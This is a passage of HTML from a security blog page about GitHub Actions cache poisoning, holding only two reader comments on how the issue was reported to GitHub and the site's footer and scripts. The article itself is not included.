55px;"><span class="button"><span>Like</span></span> <span class="loading">Loading…</span></div><span class="sd-text-color"></span><a class="sd-link-color"></a></div></div></div></div>



<div class="wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
<div class="wp-block-comments" style="margin-top:var(--wp--preset--spacing--70)"><h2 id="comments" class="wp-block-comments-title">2 responses to “The Monsters in Your Build Cache – GitHub Actions Cache&nbsp;Poisoning”</h2>

<ol class="wp-block-comment-template"><li id="comment-79" class="comment even thread-even depth-1">

<div class="wp-block-columns is-not-stacked-on-mobile is-layout-flex wp-container-core-columns-is-layout-2 wp-block-columns-is-layout-flex">
<div class="wp-block-column is-layout-flow wp-block-column-is-layout-flow" style="flex-basis:40px"><div class="wp-block-avatar"><img alt="tester123 Avatar" src="https://2.gravatar.com/avatar/2972322642ae8c3bbe8d2d9a92f538d2c77da0575b49751715c36a0afd3ffa17?s=40&amp;d=identicon&amp;r=G" srcset="https://2.gravatar.com/avatar/2972322642ae8c3bbe8d2d9a92f538d2c77da0575b49751715c36a0afd3ffa17?s=40&amp;d=identicon&amp;r=G 1x, https://2.gravatar.com/avatar/2972322642ae8c3bbe8d2d9a92f538d2c77da0575b49751715c36a0afd3ffa17?s=60&amp;d=identicon&amp;r=G 1.5x, https://2.gravatar.com/avatar/2972322642ae8c3bbe8d2d9a92f538d2c77da0575b49751715c36a0afd3ffa17?s=80&amp;d=identicon&amp;r=G 2x, https://2.gravatar.com/avatar/2972322642ae8c3bbe8d2d9a92f538d2c77da0575b49751715c36a0afd3ffa17?s=120&amp;d=identicon&amp;r=G 3x, https://2.gravatar.com/avatar/2972322642ae8c3bbe8d2d9a92f538d2c77da0575b49751715c36a0afd3ffa17?s=160&amp;d=identicon&amp;r=G 4x" class="avatar avatar-40 wp-block-avatar__image wp-hovercard-attachment grav-hashed grav-hijack" height="40" width="40" loading="lazy" decoding="async"></div></div>



<div class="wp-block-column is-layout-flow wp-container-core-column-is-layout-5 wp-block-column-is-layout-flow">
<div class="wp-block-group is-layout-flex wp-container-core-group-is-layout-10 wp-block-group-is-layout-flex" style="margin-top:0px;margin-bottom:0px"><div class="wp-block-comment-author-name">tester123</div>

<div class="wp-block-comment-date"><time datetime="2024-06-10T12:13:11-04:00">June 10, 2024</time></div>

</div>


<div class="wp-block-comment-content"><p>This issue is related to github so why did you report it to google ?<br>I think Microsoft owns the Github. </p>
<p id="comment-like-79" data-liked="comment-not-liked" class="comment-likes comment-not-liked"><a href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/?like_comment=79&amp;_wpnonce=3bef233f3c" class="comment-like-link needs-login" rel="nofollow" data-blog="227025655"><span>Like</span></a><span id="comment-like-count-79" class="comment-like-feedback">Like</span></p>
</div>

<div class="wp-block-comment-reply-link"><a rel="nofollow" class="comment-reply-link" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/comment-page-1/?replytocom=79#respond" data-commentid="79" data-postid="454" data-belowelement="comment-79" data-respondelement="respond" data-replyto="Reply to tester123" aria-label="Reply to tester123">Reply</a></div></div>
</div>

<ol><li id="comment-80" class="comment byuser comment-author-adnanthekhanc03ad33378 bypostauthor odd alt depth-2">

<div class="wp-block-columns is-not-stacked-on-mobile is-layout-flex wp-container-core-columns-is-layout-3 wp-block-columns-is-layout-flex">
<div class="wp-block-column is-layout-flow wp-block-column-is-layout-flow" style="flex-basis:40px"><div class="wp-block-avatar"><img alt="adnanthekhan Avatar" src="https://2.gravatar.com/avatar/8ffac4e67b1e83455647b4baa16b2103bdbae991c0cc6dac84c390d1d710ff7d?s=40&amp;d=identicon&amp;r=G" srcset="https://2.gravatar.com/avatar/8ffac4e67b1e83455647b4baa16b2103bdbae991c0cc6dac84c390d1d710ff7d?s=40&amp;d=identicon&amp;r=G 1x, https://2.gravatar.com/avatar/8ffac4e67b1e83455647b4baa16b2103bdbae991c0cc6dac84c390d1d710ff7d?s=60&amp;d=identicon&amp;r=G 1.5x, https://2.gravatar.com/avatar/8ffac4e67b1e83455647b4baa16b2103bdbae991c0cc6dac84c390d1d710ff7d?s=80&amp;d=identicon&amp;r=G 2x, https://2.gravatar.com/avatar/8ffac4e67b1e83455647b4baa16b2103bdbae991c0cc6dac84c390d1d710ff7d?s=120&amp;d=identicon&amp;r=G 3x, https://2.gravatar.com/avatar/8ffac4e67b1e83455647b4baa16b2103bdbae991c0cc6dac84c390d1d710ff7d?s=160&amp;d=identicon&amp;r=G 4x" class="avatar avatar-40 wp-block-avatar__image wp-hovercard-attachment grav-hashed grav-hijack" height="40" width="40" loading="lazy" decoding="async"></div></div>



<div class="wp-block-column is-layout-flow wp-container-core-column-is-layout-7 wp-block-column-is-layout-flow">
<div class="wp-block-group is-layout-flex wp-container-core-group-is-layout-11 wp-block-group-is-layout-flex" style="margin-top:0px;margin-bottom:0px"><div class="wp-block-comment-author-name"><a rel="external nofollow ugc" href="https://adnanthekhancom.wordpress.com" target="_self">adnanthekhan</a></div>

<div class="wp-block-comment-date"><time datetime="2024-06-10T12:39:57-04:00">June 10, 2024</time></div>

</div>


<div class="wp-block-comment-content"><p>What happened here was that I reported it to GitHub and GitHub did not consider it a security issue. As a result, if any repositories are vulnerable to cache poisoning (because they run un-trusted code in the context of the main branch and other more privileged workflows use caching), then it’s a bug within end user repositories, not GitHub.</p>
<p id="comment-like-80" data-liked="comment-not-liked" class="comment-likes comment-not-liked"><a href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/?like_comment=80&amp;_wpnonce=e359f29337" class="comment-like-link needs-login" rel="nofollow" data-blog="227025655"><span>Like</span></a><span id="comment-like-count-80" class="comment-like-feedback">Like</span></p>
</div>

<div class="wp-block-comment-reply-link"><a rel="nofollow" class="comment-reply-link" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/comment-page-1/?replytocom=80#respond" data-commentid="80" data-postid="454" data-belowelement="comment-80" data-respondelement="respond" data-replyto="Reply to adnanthekhan" aria-label="Reply to adnanthekhan">Reply</a></div></div>
</div>

</li></ol></li></ol>



	<div id="respond" class="comment-respond wp-block-post-comments-form">
		<h3 id="reply-title" class="comment-reply-title">Leave a comment <small><a rel="nofollow" id="cancel-comment-reply-link" href="/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://adnanthekhan.com/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate="">



<div id="comment-form__verbum" class="transparent"></div><div class="verbum-form-meta"><input type="hidden" name="comment_post_ID" value="454" id="comment_post_ID">
<input type="hidden" name="comment_parent" id="comment_parent" value="0">

			<input type="hidden" name="highlander_comment_nonce" id="highlander_comment_nonce" value="0667cbc344">
			<input type="hidden" name="verbum_show_subscription_modal" value=""></div><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="8454305e78"></p><p style="display: none !important;" class="akismet-fields-container" data-prefix="ak_"><label>Δ<textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100"></textarea></label><input type="hidden" id="ak_js_1" name="ak_js" value="1718452120378"><script>document.getElementById( "ak_js_1" ).setAttribute( "value", ( new Date() ).getTime() );</script></p></form>	</div><!-- #respond -->
	</div>
</div>



<div class="wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained" style="margin-top:var(--wp--preset--spacing--60)">
<div class="wp-block-group is-content-justification-space-between is-nowrap is-layout-flex wp-container-core-group-is-layout-13 wp-block-group-is-layout-flex"><div class="post-navigation-link-previous wp-block-post-navigation-link"><span class="post-navigation-link__label">Previous Post<br></span> <a href="https://adnanthekhan.com/2024/04/15/an-obscure-actions-workflow-vulnerability-in-googles-flank/" rel="prev">An Obscure Actions Workflow Vulnerability in Google’s&nbsp;Flank</a></div>

<div class="post-navigation-link-next has-text-align-right wp-block-post-navigation-link"></div></div>
</div>
</main>


<footer class="wp-block-template-part">
<div class="wp-block-group alignfull is-layout-flow wp-container-core-group-is-layout-16 wp-block-group-is-layout-flow" style="padding-top:4em;padding-right:var(--wp--preset--spacing--60);padding-bottom:2em;padding-left:var(--wp--preset--spacing--60)"><h1 style="font-style:normal;font-weight:700;" class="has-text-align-center wp-block-site-title has-medium-font-size"><a href="https://adnanthekhan.com" target="_self" rel="home">Adnan Khan's Blog</a></h1>

<p class="has-text-align-center wp-block-site-tagline has-small-font-size">Red Teaming, CI/CD Security, and more</p>


<ul class="wp-block-social-links has-icon-color is-style-logos-only is-content-justification-center is-layout-flex wp-container-core-social-links-is-layout-2 wp-block-social-links-is-layout-flex"><li style="color: #007cba; " class="wp-social-link wp-social-link-linkedin has-primary-color wp-block-social-link"><a href="https://www.linkedin.com/in/adnanekhan/" class="wp-block-social-link-anchor"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"><path d="M19.7,3H4.3C3.582,3,3,3.582,3,4.3v15.4C3,20.418,3.582,21,4.3,21h15.4c0.718,0,1.3-0.582,1.3-1.3V4.3 C21,3.582,20.418,3,19.7,3z M8.339,18.338H5.667v-8.59h2.672V18.338z M7.004,8.574c-0.857,0-1.549-0.694-1.549-1.548 c0-0.855,0.691-1.548,1.549-1.548c0.854,0,1.547,0.694,1.547,1.548C8.551,7.881,7.858,8.574,7.004,8.574z M18.339,18.338h-2.669 v-4.177c0-0.996-0.017-2.278-1.387-2.278c-1.389,0-1.601,1.086-1.601,2.206v4.249h-2.667v-8.59h2.559v1.174h0.037 c0.356-0.675,1.227-1.387,2.526-1.387c2.703,0,3.203,1.779,3.203,4.092V18.338z"></path></svg><span class="wp-block-social-link-label screen-reader-text">LinkedIn</span></a></li>

<li style="color: #007cba; " class="wp-social-link wp-social-link-x has-primary-color wp-block-social-link"><a href="https://x.com/adnanthekhan" class="wp-block-social-link-anchor"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"><path d="M13.982 10.622 20.54 3h-1.554l-5.693 6.618L8.745 3H3.5l6.876 10.007L3.5 21h1.554l6.012-6.989L15.868 21h5.245l-7.131-10.378Zm-2.128 2.474-.697-.997-5.543-7.93H8l4.474 6.4.697.996 5.815 8.318h-2.387l-4.745-6.787Z"></path></svg><span class="wp-block-social-link-label screen-reader-text">X</span></a></li>

<li style="color: #007cba; " class="wp-social-link wp-social-link-github has-primary-color wp-block-social-link"><a href="https://github.com/adnanEkhan" class="wp-block-social-link-anchor"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"><path d="M12,2C6.477,2,2,6.477,2,12c0,4.419,2.865,8.166,6.839,9.489c0.5,0.09,0.682-0.218,0.682-0.484 c0-0.236-0.009-0.866-0.014-1.699c-2.782,0.602-3.369-1.34-3.369-1.34c-0.455-1.157-1.11-1.465-1.11-1.465 c-0.909-0.62,0.069-0.608,0.069-0.608c1.004,0.071,1.532,1.03,1.532,1.03c0.891,1.529,2.341,1.089,2.91,0.833 c0.091-0.647,0.349-1.086,0.635-1.337c-2.22-0.251-4.555-1.111-4.555-4.943c0-1.091,0.39-1.984,1.03-2.682 C6.546,8.54,6.202,7.524,6.746,6.148c0,0,0.84-0.269,2.75,1.025C10.295,6.95,11.15,6.84,12,6.836 c0.85,0.004,1.705,0.114,2.504,0.336c1.909-1.294,2.748-1.025,2.748-1.025c0.546,1.376,0.202,2.394,0.1,2.646 c0.64,0.699,1.026,1.591,1.026,2.682c0,3.841-2.337,4.687-4.565,4.935c0.359,0.307,0.679,0.917,0.679,1.852 c0,1.335-0.012,2.415-0.012,2.741c0,0.269,0.18,0.579,0.688,0.481C19.138,20.161,22,16.416,22,12C22,6.477,17.523,2,12,2z"></path></svg><span class="wp-block-social-link-label screen-reader-text">GitHub</span></a></li>

<li style="color: #007cba; " class="wp-social-link wp-social-link-mail has-primary-color wp-block-social-link"><a href="mailto:me@adnanthekhan.com" class="wp-block-social-link-anchor"><svg width="24" height="24" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false"><path d="M19,5H5c-1.1,0-2,.9-2,2v10c0,1.1.9,2,2,2h14c1.1,0,2-.9,2-2V7c0-1.1-.9-2-2-2zm.5,12c0,.3-.2.5-.5.5H5c-.3,0-.5-.2-.5-.5V9.8l7.5,5.6,7.5-5.6V17zm0-9.1L12,13.6,4.5,7.9V7c0-.3.2-.5.5-.5h14c.3,0,.5.2.5.5v.9z"></path></svg><span class="wp-block-social-link-label screen-reader-text">Mail</span></a></li></ul>



<div style="height:8px" aria-hidden="true" class="wp-block-spacer"></div>



<p class="has-text-align-center has-small-font-size"><a href="https://wordpress.com/?ref=footer_blog" rel="nofollow">Blog at WordPress.com.</a></p>
</div>
</footer></div>
<!-- wpcom_wp_footer -->
<script src="//0.gravatar.com/js/hovercards/hovercards.min.js?ver=2024244cee4591fae4bea45ee2571078613ea2fab8a404a7b5ceb1cf2b511ebc67fadd" id="grofiles-cards-js"></script>
<script id="wpgroho-js-extra">
var WPGroHo = {"my_hash":""};
</script>
<script crossorigin="anonymous" type="text/javascript" src="https://s0.wp.com/wp-content/mu-plugins/gravatar-hovercards/wpgroho.js?m=1610363240i"></script>

	<script>
		// Initialize and attach hovercards to all gravatars
		( function() {
			function init() {
				if ( typeof Gravatar === 'undefined' ) {
					return;
				}

				if ( typeof Gravatar.init !== 'function' ) {
					return;
				}

				Gravatar.profile_cb = function ( hash, id ) {
					WPGroHo.syncProfileData( hash, id );
				};

				Gravatar.my_hash = WPGroHo.my_hash;
				Gravatar.init(
					'body',
					'#wp-admin-bar-my-account',
					{
						i18n: {
							'Edit your profile': 'Edit your profile',
							'View profile': 'View profile',
							'Sorry, we are unable to load this Gravatar profile.': 'Sorry, we are unable to load this Gravatar profile.',
							'Sorry, we are unable to load this Gravatar profile. Please check your internet connection.': 'Sorry, we are unable to load this Gravatar profile. Please check your internet connection.',
							'Too Many Requests.': 'Too Many Requests.',
							'Internal Server Error.': 'Internal Server Error.',
						},
					}
				);
			}

			if ( document.readyState !== 'loading' ) {
				init();
			} else {
				document.addEventListener( 'DOMContentLoaded', init );
			}
		} )();
	</script>

		<div style="display:none">
	<div class="grofile-hash-map-b876ccb63b1f71d7ee1367f30b99cbc0">
	</div>
	<div class="grofile-hash-map-736001db8b92ae329b29a03fc0d85395">
	</div>
	</div>
		<div id="jp-carousel-loading-overlay">
			<div id="jp-carousel-loading-wrapper">
				<span id="jp-carousel-library-loading">&nbsp;</span>
			</div>
		</div>
		<div class="jp-carousel-overlay" style="display: none;">

		<div class="jp-carousel-container">
			<!-- The Carousel Swiper -->
			<div class="jp-carousel-wrap swiper-container jp-carousel-swiper-container jp-carousel-transitions" itemscope="" itemtype="https://schema.org/ImageGallery">
				<div class="jp-carousel swiper-wrapper"></div>
				<div class="jp-swiper-button-prev swiper-button-prev">
					<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
						<mask id="maskPrev" mask-type="alpha" maskUnits="userSpaceOnUse" x="8" y="6" width="9" height="12">
							<path d="M16.2072 16.59L11.6496 12L16.2072 7.41L14.8041 6L8.8335 12L14.8041 18L16.2072 16.59Z" fill="white"></path>
						</mask>
						<g mask="url(#maskPrev)">
							<rect x="0.579102" width="23.8823" height="24" fill="#FFFFFF"></rect>
						</g>
					</svg>
				</div>
				<div class="jp-swiper-button-next swiper-button-next">
					<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
						<mask id="maskNext" mask-type="alpha" maskUnits="userSpaceOnUse" x="8" y="6" width="8" height="12">
							<path d="M8.59814 16.59L13.1557 12L8.59814 7.41L10.0012 6L15.9718 12L10.0012 18L8.59814 16.59Z" fill="white"></path>
						</mask>
						<g mask="url(#maskNext)">
							<rect x="0.34375" width="23.8822" height="24" fill="#FFFFFF"></rect>
						</g>
					</svg>
				</div>
			</div>
			<!-- The main close buton -->
			<div class="jp-carousel-close-hint">
				<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
					<mask id="maskClose" mask-type="alpha" maskUnits="userSpaceOnUse" x="5" y="5" width="15" height="14">
						<path d="M19.3166 6.41L17.9135 5L12.3509 10.59L6.78834 5L5.38525 6.41L10.9478 12L5.38525 17.59L6.78834 19L12.3509 13.41L17.9135 19L19.3166 17.59L13.754 12L19.3166 6.41Z" fill="white"></path>
					</mask>
					<g mask="url(#maskClose)">
						<rect x="0.409668" width="23.8823" height="24" fill="#FFFFFF"></rect>
					</g>
				</svg>
			</div>
			<!-- Image info, comments and meta -->
			<div class="jp-carousel-info">
				<div class="jp-carousel-info-footer">
					<div class="jp-carousel-pagination-container">
						<div class="jp-swiper-pagination swiper-pagination"></div>
						<div class="jp-carousel-pagination"></div>
					</div>
					<div class="jp-carousel-photo-title-container">
						<h2 class="jp-carousel-photo-caption"></h2>
					</div>
					<div class="jp-carousel-photo-icons-container">
						<a href="#" class="jp-carousel-icon-btn jp-carousel-icon-info" aria-label="Toggle photo metadata visibility">
							<span class="jp-carousel-icon">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="maskInfo" mask-type="alpha" maskUnits="userSpaceOnUse" x="2" y="2" width="21" height="20">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M12.7537 2C7.26076 2 2.80273 6.48 2.80273 12C2.80273 17.52 7.26076 22 12.7537 22C18.2466 22 22.7046 17.52 22.7046 12C22.7046 6.48 18.2466 2 12.7537 2ZM11.7586 7V9H13.7488V7H11.7586ZM11.7586 11V17H13.7488V11H11.7586ZM4.79292 12C4.79292 16.41 8.36531 20 12.7537 20C17.142 20 20.7144 16.41 20.7144 12C20.7144 7.59 17.142 4 12.7537 4C8.36531 4 4.79292 7.59 4.79292 12Z" fill="white"></path>
									</mask>
									<g mask="url(#maskInfo)">
										<rect x="0.8125" width="23.8823" height="24" fill="#FFFFFF"></rect>
									</g>
								</svg>
							</span>
						</a>
												<a href="#" class="jp-carousel-icon-btn jp-carousel-icon-comments" aria-label="Toggle photo comments visibility">
							<span class="jp-carousel-icon">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="maskComments" mask-type="alpha" maskUnits="userSpaceOnUse" x="2" y="2" width="21" height="20">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M4.3271 2H20.2486C21.3432 2 22.2388 2.9 22.2388 4V16C22.2388 17.1 21.3432 18 20.2486 18H6.31729L2.33691 22V4C2.33691 2.9 3.2325 2 4.3271 2ZM6.31729 16H20.2486V4H4.3271V18L6.31729 16Z" fill="white"></path>
									</mask>
									<g mask="url(#maskComments)">
										<rect x="0.34668" width="23.8823" height="24" fill="#FFFFFF"></rect>
									</g>
								</svg>

								<span class="jp-carousel-has-comments-indicator" aria-label="This image has comments."></span>
							</span>
						</a>
											</div>
				</div>
				<div class="jp-carousel-info-extra">
					<div class="jp-carousel-info-content-wrapper">
						<div class="jp-carousel-photo-title-container">
							<h2 class="jp-carousel-photo-title"></h2>
						</div>
						<div class="jp-carousel-comments-wrapper">
															<div id="jp-carousel-comments-loading">
									<span>Loading Comments...</span>
								</div>
								<div class="jp-carousel-comments"></div>
								<div id="jp-carousel-comment-form-container">
									<span id="jp-carousel-comment-form-spinner">&nbsp;</span>
									<div id="jp-carousel-comment-post-results"></div>
																														<form id="jp-carousel-comment-form">
												<label for="jp-carousel-comment-form-comment-field" class="screen-reader-text">Write a Comment...</label>
												<textarea name="comment" class="jp-carousel-comment-form-field jp-carousel-comment-form-textarea" id="jp-carousel-comment-form-comment-field" placeholder="Write a Comment..."></textarea>
												<div id="jp-carousel-comment-form-submit-and-info-wrapper">
													<div id="jp-carousel-comment-form-commenting-as">
																													<fieldset>
																<label for="jp-carousel-comment-form-email-field">Email (Required)</label>
																<input type="text" name="email" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-email-field">
															</fieldset>
															<fieldset>
																<label for="jp-carousel-comment-form-author-field">Name (Required)</label>
																<input type="text" name="author" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-author-field">
															</fieldset>
															<fieldset>
																<label for="jp-carousel-comment-form-url-field">Website</label>
																<input type="text" name="url" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-url-field">
															</fieldset>
																											</div>
													<input type="submit" name="submit" class="jp-carousel-comment-form-button" id="jp-carousel-comment-form-button-submit" value="Post Comment">
												</div>
											</form>
																											</div>
													</div>
						<div class="jp-carousel-image-meta">
							<div class="jp-carousel-title-and-caption">
								<div class="jp-carousel-photo-info">
									<h3 class="jp-carousel-caption" itemprop="caption description"></h3>
								</div>

								<div class="jp-carousel-photo-description"></div>
							</div>
							<ul class="jp-carousel-image-exif" style="display: none;"></ul>
							<a class="jp-carousel-image-download" href="#" target="_blank" style="display: none;">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="mask0" mask-type="alpha" maskUnits="userSpaceOnUse" x="3" y="3" width="19" height="18">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M5.84615 5V19H19.7775V12H21.7677V19C21.7677 20.1 20.8721 21 19.7775 21H5.84615C4.74159 21 3.85596 20.1 3.85596 19V5C3.85596 3.9 4.74159 3 5.84615 3H12.8118V5H5.84615ZM14.802 5V3H21.7677V10H19.7775V6.41L9.99569 16.24L8.59261 14.83L18.3744 5H14.802Z" fill="white"></path>
									</mask>
									<g mask="url(#mask0)">
										<rect x="0.870605" width="23.8823" height="24" fill="#FFFFFF"></rect>
									</g>
								</svg>
								<span class="jp-carousel-download-text"></span>
							</a>
							<div class="jp-carousel-image-map" style="display: none;"></div>
						</div>
					</div>
				</div>
			</div>
		</div>

		</div>
		
	<script type="text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/adnanthekhan.com\/2024\/05\/06\/the-monsters-in-your-build-cache-github-actions-cache-poisoning\/":454};
	</script>
					<div id="actionbar" class="actnbr-pub-creatio-2 actnbr-has-follow">
		<ul>
								<li class="actnbr-btn actnbr-hidden">
						<a class="actnbr-action actnbr-actn-comment" href="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#comments">
							<svg class="gridicon gridicons-comment" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M12 16l-5 5v-5H5c-1.1 0-2-.9-2-2V5c0-1.1.9-2 2-2h14c1.1 0 2 .9 2 2v9c0 1.1-.9 2-2 2h-7z"></path></g></svg>							<span>Comment						</span>
						</a>
					</li>
									<li class="actnbr-btn actnbr-hidden">
						<a class="actnbr-action actnbr-actn-reblog" href="">
							<svg class="gridicon gridicons-reblog" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M22.086 9.914L20 7.828V18c0 1.105-.895 2-2 2h-7v-2h7V7.828l-2.086 2.086L14.5 8.5 19 4l4.5 4.5-1.414 1.414zM6 16.172V6h7V4H6c-1.105 0-2 .895-2 2v10.172l-2.086-2.086L.5 15.5 5 20l4.5-4.5-1.414-1.414L6 16.172z"></path></g></svg><span>Reblog</span>
						</a>
					</li>
									<li class="actnbr-btn actnbr-hidden">
								<a class="actnbr-action actnbr-actn-follow " href="">
			<svg class="gridicon" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path clip-rule="evenodd" d="m4 4.5h12v6.5h1.5v-6.5-1.5h-1.5-12-1.5v1.5 10.5c0 1.1046.89543 2 2 2h7v-1.5h-7c-.27614 0-.5-.2239-.5-.5zm10.5 2h-9v1.5h9zm-5 3h-4v1.5h4zm3.5 1.5h-1v1h1zm-1-1.5h-1.5v1.5 1 1.5h1.5 1 1.5v-1.5-1-1.5h-1.5zm-2.5 2.5h-4v1.5h4zm6.5 1.25h1.5v2.25h2.25v1.5h-2.25v2.25h-1.5v-2.25h-2.25v-1.5h2.25z" fill-rule="evenodd"></path></svg>
			<span>Subscribe</span>
		</a>
		<a class="actnbr-action actnbr-actn-following  no-display" href="">
			<svg class="gridicon" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path fill-rule="evenodd" clip-rule="evenodd" d="M16 4.5H4V15C4 15.2761 4.22386 15.5 4.5 15.5H11.5V17H4.5C3.39543 17 2.5 16.1046 2.5 15V4.5V3H4H16H17.5V4.5V12.5H16V4.5ZM5.5 6.5H14.5V8H5.5V6.5ZM5.5 9.5H9.5V11H5.5V9.5ZM12 11H13V12H12V11ZM10.5 9.5H12H13H14.5V11V12V13.5H13H12H10.5V12V11V9.5ZM5.5 12H9.5V13.5H5.5V12Z" fill="#008A20"></path><path class="following-icon-tick" d="M13.5 16L15.5 18L19 14.5" stroke="#008A20" stroke-width="1.5"></path></svg>
			<span>Subscribed</span>
		</a>
							<div class="actnbr-popover tip tip-top-left actnbr-notice" id="follow-bubble">
							<div class="tip-arrow"></div>
							<div class="tip-inner actnbr-follow-bubble">
															<ul>
											<li class="actnbr-sitename">
			<a href="https://adnanthekhan.com">
				<img alt="" src="https://adnanthekhan.com/wp-content/uploads/2023/12/aklogo.png?w=50" srcset="https://adnanthekhan.com/wp-content/uploads/2023/12/aklogo.png?w=50 1x, https://adnanthekhan.com/wp-content/uploads/2023/12/aklogo.png?w=75 1.5x, https://adnanthekhan.com/wp-content/uploads/2023/12/aklogo.png?w=100 2x, https://adnanthekhan.com/wp-content/uploads/2023/12/aklogo.png?w=150 3x, https://adnanthekhan.com/wp-content/uploads/2023/12/aklogo.png?w=200 4x" class="avatar avatar-50" height="50" width="50">				Adnan Khan's Blog			</a>
		</li>
										<div class="actnbr-message no-display"></div>
									<form method="post" action="https://subscribe.wordpress.com" accept-charset="utf-8" style="display: none;">
																				<div>
										<input type="email" name="email" placeholder="Enter your email address" class="actnbr-email-field" aria-label="Enter your email address">
										</div>
										<input type="hidden" name="action" value="subscribe">
										<input type="hidden" name="blog_id" value="227025655">
										<input type="hidden" name="source" value="https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/">
										<input type="hidden" name="sub-type" value="actionbar-follow">
										<input type="hidden" id="_wpnonce" name="_wpnonce" value="6158a0aec4">										<div class="actnbr-button-wrap">
											<button type="submit" value="Sign me up">
												Sign me up											</button>
										</div>
									</form>
									<li class="actnbr-login-nudge">
										<div>
											Already have a WordPress.com account? <a href="https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fadnanthekhan.com%252F2024%252F05%252F06%252Fthe-monsters-in-your-build-cache-github-actions-cache-poisoning%252F">Log in now.</a>										</div>
									</li>
								</ul>
															</div>
						</div>
					</li>
									<li class="actnbr-btn actnbr-hidden no-display" onclick="javascript:__tcfapi( 'showUi' );">
						<a class="actnbr-action actnbr-actn-privacy" href="#">
							<svg class="gridicon gridicons-info-outline" height="20" width="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M13 9h-2V7h2v2zm0 2h-2v6h2v-6zm-1-7c-4.41 0-8 3.59-8 8s3.59 8 8 8 8-3.59 8-8-3.59-8-8-8m0-2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12 6.477 2 12 2z"></path></g></svg>							<span>Privacy						</span>
						</a>
					</li>
							<li class="actnbr-ellipsis actnbr-hidden">
				<svg class="gridicon gridicons-ellipsis" height="24" width="24" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path d="M7 12c0 1.104-.896 2-2 2s-2-.896-2-2 .896-2 2-2 2 .896 2 2zm12-2c-1.104 0-2 .896-2 2s.896 2 2 2 2-.896 2-2-.896-2-2-2zm-7 0c-1.104 0-2 .896-2 2s.896 2 2 2 2-.896 2-2-.896-2-2-2z"></path></g></svg>				<div class="actnbr-popover tip tip-top-left actnbr-more">
					<div class="tip-arrow"></div>
					<div class="tip-inner">
						<ul>
									<li class="actnbr-sitename">
			<a href="https://adnanthekhan.com">
				<img alt="" src="https://adnanthekhan.com/wp-content/uploads/2023/12/aklogo.png?w=50" srcset="https://adnanthekhan.com/wp-content/uploads/2023/12/aklogo.png?w=50 1x, https://adnanthekhan.com/wp-content/uploads/2023/12/aklogo.png?w=75 1.5x, https://adnanthekhan.com/wp-content/uploads/2023/12/aklogo.png?w=100 2x, https://adnanthekhan.com/wp-content/uploads/2023/12/aklogo.png?w=150 3x, https://adnanthekhan.com/wp-content/uploads/2023/12/aklogo.png?w=200 4x" class="avatar avatar-50" height="50" width="50">				Adnan Khan's Blog			</a>
		</li>
								<li class="actnbr-folded-customize">
								<a href="https://adnanthekhancom.wordpress.com/wp-admin/site-editor.php?postType=wp_template&amp;postId=pub/creatio-2//single">
